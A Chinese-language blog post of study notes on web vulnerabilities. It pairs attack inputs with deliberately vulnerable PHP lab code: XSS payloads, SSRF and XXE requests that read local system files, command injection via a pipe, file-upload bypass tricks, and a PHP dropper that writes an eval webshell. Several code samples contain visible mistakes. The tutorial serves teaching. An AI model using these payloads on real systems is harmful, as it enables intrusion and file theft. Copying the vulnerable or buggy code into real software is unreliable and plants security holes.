---
title: Web安全原理
date: 2024-01-01 19:55:10
tags: Web
mathjax: true
---

# Web安全原理

## XSS跨站脚本攻击

### 反射型XSS

```
http://xxx/xss1.php?xss_input_value="><img src=1 onerror=alert(/xss/)/>"
```

代码分析：

```php+HTML
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
        <title>XSS</title>
    </head>
    <body>
        <center>
            <h6>输入字符串输出到input的value里</h6>
            <form action="" method="get">
                <h6>输入字符串</h6>
                <input type="text" name="xss_input_value" value="输入"><br/>
                <input type="submit">
            </form>
            <hr>
            <?php
                if(!isset($_GET['xss_input_value'])){
                    echo '<input type="text" value="'.$_GET['xss_input_value'].'">';
                }else{
                    echo '<input type="text" value="输出">';
                }
            ?>
        </center>
    </body>
</html>
```

### 储存型XSS

输入标题为以下，任何人打开页面触发：

```html
<img src=X onerror=alert(/xss/)/>
```

代码分析：

```php+HTML
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
        <title>留言板</title>
    </head>
    <body>
        <center>
            <h6>输入留言内容</h6>
            <form action="" method="post">
                标题：<input type="text" name="title"><br/>
                内容：<textarea name="context"></textarea><br/>
                <input type="submit">
            </form>
            <hr>
            <?php
                $con=mysqli_connect("localhost","root","123456","text");
                if(mysqli_connect_errno()){
                    echo "连接失败".mysqli_connect_error();
                }
                if(isset($_POST['title'])){
                    $result1=mysqli_query($con,"insert into xss('title','content')values('".$_POST['title']."','".$_POST['content']."')");
                }
                $result2=mysqli_query($con,"select * from xss");
                echo "<table border='1'><tr><td>标题</td><td>内容</td></tr>";
                while($row=mysqli_fetch_array($result2)){
                    echo "<tr><td>".$row['title']."</td><td>".$row['content']."</td>";
                }
                echo "</table>";
            ?>
        </center>
    </body>
</html>
```

### DOM型XSS

输入以下并点击替换触发：

```html
<img src=X onerror=alert(/xss/)/>
```

代码分析：

```html
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
        <title>Test</title>
        <script type="text/javascript">
            function tihuan(){
                document.getElementById("id1").innerHTML=document.getElementById("dom_input").value;
            }
        </script>
    </head>
    <body>
        <center>
            <h6 id="id1">这里显示输入内容</h6>
            <form action="" method="post">
                <input type="text" id="dom_input" value="输入"><br/>
                <input type="button" value="替换" onclick="tihuan()">
            </form>
            <hr>
        </center>
    </body>
</html>
```

### 常用语句

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```

## CSRF跨站请求伪造攻击

在一个博客系统发布文章的页面，单击发布文章用bp抓包，右键->Engagement tools->Generate CSRF PoC->Copy HTML。发布例如1.html，目标用户访问该页面后目标用户自动发布一篇文章。

代码分析：

```php
<?php
    session_start();
    if(isset($_GET['login'])){
        $con=mysqli_connect("localhost","root","123456","test");
        if(mysqli_connect_errno()){
            echo "连接失败".mysqli_connect_error();
        }
        $username=addslashes($_GET['usrename']);
        $password=$_GET['password'];
        $result=mysqli_query($con,"select * from users where `username`='".$username."' and `password`='".md5($password)."'");
        $row=mysqli_fetch_array($result);
        if($row){
            $_SESSION['isadmin']='admin';
            exit("登录成功")
        }else{
            $_SESSION['isadmin']='guest';
            exit("登录失败");
        }
    }else{
        $_SESSION['isadmin']='guest';
    }
    if($_SESSION['isadmin']!='admin'){
        exit("请登录后台");
    }
    if(isset($_POST['submit'])){
        if(isset($_POST['username'])){
            $result1=mysqli_query($con,"insert into users(`username`,`password`)values('".$_POST['username']."','".md5($_POST['password'])."')");
            exit($_POST['username']."添加成功");
        }
    }
?>
```

## SSRF服务器端请求伪造攻击

正常使用：

```
http://xxx/ssrf.php?url=http://127.0.0.1/2.php
```

篡改URL网址：

```
http://xxx/ssrf.php?url=http://www.baidu.com/
```

内网资源刺探：

```
http://xxx/ssrf.php?url=192.168.0.2:3306
```

本地文件读取：

```
http://xxx/ssrf.php?url=file://C:/Windows/win.ini
```

代码分析：

```php
<?php
    function curl($url){
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_HEADER,0);
        curl_exec($ch);
        curl_close($ch);
    }
    $url=$_GET['url'];
    curl($url);
?>
```

## 文件上传漏洞

### JS检测绕过攻击

攻击方法有两种：

1. 直接删除相关JS代码。
2. 修改成允许上传的文件后缀，再抓包改回来。

```html
<html>
    <head>
        <title>JS检查文件后缀</title>
    </head>
    <body>
        <script type="text/javascript">
            function selectFile(fnUpload){
                var filename=fnUpload.value;
                var mime=filename.toLowerCase().substr(filename.lastIndexOf("."));
                if(mime!=".jpg"){
                    alert("请选择jpg格式照片上传");
                    fnUpload.outerHTML=fnUpload.outerHTML;
                }
            }
        </script>
        <form action="upload2.php" method="post" enctype="multipart/form-data">
            <label for="file">Filename:</label>
            <input type="file" name="file" id="file" onchange="selectFile(this)"/>
            <br/>
            <input type="submit" name="submit" value="submit"/>
        </form>
    </body>
</html>
```

服务端upload2.php：

```php
<?php
    if($_FILES["files"]["error"]>0){
        echo "Return Code:".$_FILES["file"]["error"]."<br/>";
    }
    else{
        echo "Upload:".$_FILES["file"]["name"]."<br/>";
        echo "Type:".$_FILES["file"]["type"]."<br/>";
        echo "Size:".($_FILES["file"]["size"]/1024)."Kb<br/>";
        echo "Temp file:".$_FILES["file"]["tmp_name"]."<br/>";
        if(file_exists("upload/".$_FILES["file"]["name"])){
            echo $_FILES["file"]["name"]."already exists.";
        }
        else{
            move_uploaded_file($_FILES["file"]["tmp_name"],"upload/".$_FILES["file"]["name"]);
            echo "Stored in:"."upload/".$_FILES["file"]["name"];
        }
    }
?>
```

### 文件后缀绕过攻击

当Apache的httpd.conf中有以下代码则能解析php和phtml文件：

```
AddType application/x-httpd-php .php .phtml
```

Apache中，例如1.php.xxxx，xxxx不可解析，解析为php。

代码分析：

```php
<?php
    if($_FILES["files"]["error"]>0){
        echo "Return Code:".$_FILES["file"]["error"]."<br/>";
    }
    else{
        $info=pathinfo($_FILES["file"]["name"]);
        $ext=$info['extension'];
        if(strtolower($ext)=="php"){
            exit("不允许的后缀名");
        }
        echo "Upload:".$_FILES["file"]["name"]."<br/>";
        echo "Type:".$_FILES["file"]["type"]."<br/>";
        echo "Size:".($_FILES["file"]["size"]/1024)."Kb<br/>";
        echo "Temp file:".$_FILES["file"]["tmp_name"]."<br/>";
        if(file_exists("upload/".$_FILES["file"]["name"])){
            echo $_FILES["file"]["name"]."already exists.";
        }
        else{
            move_uploaded_file($_FILES["file"]["tmp_name"],"upload/".$_FILES["file"]["name"]);
            echo "Stored in:"."upload/".$_FILES["file"]["name"];
        }
    }
?>
```

### 文件类型绕过攻击

上传php时，将Content-Type: application/octet-stream改为image/jpeg。

代码分析：

```php
<?php
    if($_FILES["files"]["error"]>0){
        echo "Return Code:".$_FILES["file"]["error"]."<br/>";
    }
    else{
        if(($_FILES["file"]["type"]!="image/gif")&&($_FILES["file"]["type"]!="image/jpeg")&&($_FILES["file"]["type"]!="iamge/pjpeg")){
            exit($_FILES["file"]["type"]);
            exit("不允许的格式");
        }
        echo "Upload:".$_FILES["file"]["name"]."<br/>";
        echo "Type:".$_FILES["file"]["type"]."<br/>";
        echo "Size:".($_FILES["file"]["size"]/1024)."Kb<br/>";
        echo "Temp file:".$_FILES["file"]["tmp_name"]."<br/>";
        if(file_exists("upload/".$_FILES["file"]["name"])){
            echo $_FILES["file"]["name"]."already exists.";
        }
        else{
            move_uploaded_file($_FILES["file"]["tmp_name"],"upload/".$_FILES["file"]["name"]);
            echo "Stored in:"."upload/".$_FILES["file"]["name"];
        }
    }
?>
```

### getimagesize拦截绕过攻击

把图片和WebShell合并成一个文件：

```bash
cat image.png webshell.php>image.php
```

getimagesize可以返回正确信息，.php也可被Apache解析：

```php
<?php
    if($_FILES["files"]["error"]>0){
        echo "Return Code:".$_FILES["file"]["error"]."<br/>";
    }
    else{
        if(!getimagesize($_FILES["file"]["tmp_name"])){
            exit("不允许的文件");
        }
        echo "Upload:".$_FILES["file"]["name"]."<br/>";
        echo "Type:".$_FILES["file"]["type"]."<br/>";
        echo "Size:".($_FILES["file"]["size"]/1024)."Kb<br/>";
        echo "Temp file:".$_FILES["file"]["tmp_name"]."<br/>";
        if(file_exists("upload/".$_FILES["file"]["name"])){
            echo $_FILES["file"]["name"]."already exists.";
        }
        else{
            move_uploaded_file($_FILES["file"]["tmp_name"],"upload/".$_FILES["file"]["name"]);
            echo "Stored in:"."upload/".$_FILES["file"]["name"];
        }
    }
?>
```

### 文件截断绕过攻击

利用条件：PHP<5.3.4、magic_quotes_gpc=OFF

漏洞点：$_REQUEST['filename']

需要上传的WebShell名为2.php，参数填2.php%00.jpg，服务器将%00截断，只剩下2.php

对于PHP，该漏洞只适用于%00法，直接改十六进制无法绕过，`$_FILES['file']['name']`获得的就是截断后的。

代码分析：

```php
<?php
    error_reporting(0);
    $ext_arr=array('flv','swf','mp3','mp4','3gp','zip','rar','gif','jpg','png','bmp')；
    $file_ext=substr($_FILES['file']['name'],strrpos($_FILES['file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $tempFile=$_FILES['file']['tmp_name'];
        $targetPath="upload/".$_REQUEST['jieduan'].rand(10,99).date("YmdHis").".".$file_ext;
        if(move_uploaded_file($tempFile,$targetPath)){
            echo '上传成功'.'<br>';
            echo '路径'.$targetPath;
        }
        else{
            echo("上传失败");
        }
    }
    else{
        echo("不允许的后缀");
    }
?>
```

### 竞争条件攻击

有些网站上传文件逻辑为：上传后检查是否包含WebShell脚本，则上传文件被上传后立即访问，释放新WebShell。

上传原父WebShell为：

```php
<?php
    fputs(fopen('../shell.php','w'),'<?php @eval($_POST[a]) ?>');
?>
```

代码分析：

```php
<?php
    if($_FILES["files"]["error"]>0){
        echo "Return Code:".$_FILES["file"]["error"]."<br/>";
    }
    else{
        echo "Upload:".$_FILES["file"]["name"]."<br/>";
        echo "Type:".$_FILES["file"]["type"]."<br/>";
        echo "Size:".($_FILES["file"]["size"]/1024)."Kb<br/>";
        echo "Temp file:".$_FILES["file"]["tmp_name"]."<br/>";
        if(file_exists("upload/".$_FILES["file"]["name"])){
            echo $_FILES["file"]["name"]."already exists.";
        }
        else{
            move_uploaded_file($_FILES["file"]["tmp_name"],"upload/".$_FILES["file"]["name"]);
            echo "Stored in:"."upload/".$_FILES["file"]["name"];
            sleep("10"); //模拟检测过程，检测到并开始删除
            unlink("upload/".$_FILES["file"]["name"]);
        }
    }
?>
```

## 暴力破解漏洞

略。

## 命令执行漏洞

正常功能：ping一个IP

```
http://xxx/1.php?ip=127.0.0.1
```

攻击：返回目录（利用Windows管道符）

```
http://xxx/1.php?ip=127.0.0.1|dir
```

代码分析：

```php
<?php
    echo system("ping -n 2 ".$_GET['ip']);
?>
```

## 逻辑漏洞

### 越权执行漏洞

略。

## XXE-XML外部实体注入漏洞

POST请求参数：

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE a [
    <!ENTITY b SYSTEM "file:///c:/windows/win.ini">
]>
<xml>
    <xxe>&b;<xxe>
</xml>
```

代码分析：

```php
<?php
    $xmlfile=file_get_contents('php://input');
    $dom=new DOMDocument();
    $dom->loadXML($xmlfile);
    $xml=simplexml_import_dom($dom);
    $xxe=$xml->xxe;
    $str="$xxe \n";
    echo $str;
?>
```

修复方法：

禁用外部实体：`libxml_disable_entity_loader(true)`。
